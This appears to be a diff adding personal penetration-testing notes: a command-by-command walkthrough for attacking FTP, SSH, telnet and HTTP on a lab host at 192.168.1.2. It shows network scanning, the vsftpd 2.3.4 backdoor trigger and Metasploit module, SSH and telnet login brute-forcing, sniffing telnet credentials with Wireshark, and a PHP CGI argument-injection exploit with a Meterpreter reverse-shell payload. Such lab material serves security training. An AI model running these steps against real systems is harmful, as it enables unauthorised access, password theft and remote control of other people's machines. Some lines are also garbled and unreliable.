@@ -1,0 +1,145 @@
+Target Services to be Exploits
+-------------------------------------------
+- FTP
+- SSH
+- TELNET
+- HTTP
+- RPC BIND & NFS
+
+Information Gathering
+----------------------------------
+
+Step 1:- 
+
+Check the Self IP Address:-
+-----------------------------------------
+#ifconfig
+
+Network Scan:-
+------------------------
+#nmap 192.168.1.*
+#netdiscover
+#netdiscover -r 192.168.1.1/24
+#nmap -sn 192.168.1.1/24
+#arp-scan -l
+
+Step 2:-
+Target:- 192.168.1.2
+
+Step 3:-
+Scan all 65535 Ports:-
+#nmap 192.168.1.2 -p-
+
+Exploiting FTP Service Running
+----------------------------------------------
+
+Step 1:- 
+
+nmap -sV 192.168.1.2 -p 21
+
+Copy the version of FTP
+
+#service postgresql start
+#msfconsole
+#search vsftpd 2.3.4
+# use exploit/unix/ftp/vsftpd_234_backdoor
+#show options
+#set RHOST 192.168.1.2
+#run
+
+id;
+ls
+cd root
+ls
+
+now close the metasploit and then exploit via telnet service.
+
+#nmap 192.168.1.2
+#telnet 192.168.1.2 21
+user squirrel:)
+pass newpass
+
+now access successfully
+
+#nmap -p 6200 192.168.1.2
+#telnet 192.168.1.2 6200
+
+
+Exploiting SSH Service
+---------------------------------
+Step1:- use auxiliary/scanner/ssh/ssh_login
+Use via bruteforce bcoz defalut set most of time
+#msfconsole
+#use auxiliary/scanner/ssh/ssh_login
+#show options
+#set RHOSTS 192.168.1.2
+#set VERBOSE true
+#set STOP_ON_Success true
+#set USER_FILE /root/Desktop/user.txt
+#set PASS_FILE /root/Desktop/pass.txt
+#run
+
+When get Success
+
+then 
+#ssh msfadmin@192.168.1.2
+#id
+#whoami
+#id;
+
+
+Exploiting telnet Service
+------------------------------------
+First Method Bruteforcing:--
+#use auxiliary/scanner/telnet/telnet_login 
+#show options
+#set RHOSTS 192.168.1.2
+#set VERBOSE true
+#set USER_FILE /root/Desktop/user.txt
+#set PASS_FILE /root/Desktop/pass.txt
+#set STOP_ON_Success true
+#run
+
+Telnet Packet Not encrypted over communication
+Second Method Wireshark:-
+#wireshark
+Stop sniffing and select the interface first the click to start sniffing then go to terminal and try to login via telnet
+
+#telnet 192.168.1.2
+=>login first
+
+In wireshark==>go to analyze==>follow==>TCP Stream
+
+
+Exploiting HTTP Service
+------------------------------------
+#nmap <ip address>
+#nmap -sV 192.168.1.2 -p 80
+#msfconsole
+#use auxiliary/scanner/http/http_version
+#show options
+#set RHOSTS 192.168.1.2
+use offensive method on msfconsole
+#searchsploit apache | grep 5.4.2 
+#grep cgi search apache 2.2.8 php 5.4.2
+
+#use exploit/multi/http/php_cgi_arg_injection
+#show options
+#set RHOSTS 192.168.1.2
+#run
+
+
+to check the user is active or not
+
+
+Other Way Of Exploiting HTTP Service
+--------------------------------------------------------
+#nmap <ip address>
+#nmap -sV <ip address> -p 80
+#msfconsole
+#use exploit/multi/http/php_cgi_arg_injection
+#show options
+#set RHOSTS 192.168.1.2
+#set payload php/meterpreter/reverse_tcp
+#show options
+#run
